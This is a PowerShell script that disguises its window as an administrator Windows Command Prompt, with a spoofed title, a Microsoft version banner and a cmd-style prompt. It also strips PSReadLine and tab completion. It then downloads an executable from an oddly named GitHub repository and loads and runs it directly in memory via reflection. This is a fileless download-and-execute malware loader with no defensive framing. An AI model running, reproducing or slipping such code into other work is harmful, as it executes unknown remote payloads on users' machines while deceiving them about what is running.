$Host.UI.RawUI.WindowTitle = "Administrator: Command Prompt"
$Host.UI.RawUI.ForegroundColor = "Gray"
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(120, 9999)
$Host.UI.RawUI.WindowSize = New-Object Management.Automation.Host.Size(120, 30)
Clear-Host
Write-Host "Microsoft Windows [Version 10.0.19045.6466]" -ForegroundColor Gray
Write-Host "(c) Microsoft Corporation. All rights reserved." -ForegroundColor Gray
Write-Host ""
function prompt { "C:\Users\$env:USERNAME>" }
Remove-Item function:tabexpansion2 -EA 0
Remove-Item function:TabExpansion -EA 0
Remove-Module PSReadLine -Force -EA 0
[System.Threading.Thread]::CurrentThread.SetApartmentState([System.Threading.ApartmentState]::STA)
$bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe")
$asm = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $asm.EntryPoint
if ($entryPoint.GetParameters().Length -eq 0) {
    $entryPoint.Invoke($null, $null)
} else {
    $entryPoint.Invoke($null, (, [string[]]@()))
}
